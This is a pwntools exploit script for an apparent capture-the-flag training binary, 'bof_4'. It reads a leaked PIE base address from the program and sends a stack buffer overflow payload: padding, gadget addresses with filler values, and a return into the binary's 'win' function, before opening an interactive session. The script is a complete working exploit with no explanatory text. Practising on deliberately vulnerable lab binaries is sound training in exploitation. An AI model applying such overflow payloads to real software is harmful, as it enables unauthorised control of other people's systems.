#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-bof4-c60d4e7f7230.training.bksec.vn"
elf = context.binary = ELF('./bof_4', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x000000000000138B
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

p.recvuntil(b'Opps! ')
PIE = int(p.recvline().strip(), 16)
log.info(f'PIE: {hex(PIE)}')

pl = b'A'*0x68
pl += flat(
    PIE + 0x000011f8 + 1,
    PIE + 0x000011f8, 0xDEADBEEFDEADBEEF,
    PIE + 0x00001201, 0xDEADBEEFDEADBEEF,
    p64(PIE + elf.sym.win)
    )
# GDB()
sla(b'number: ', pl)

p.interactive()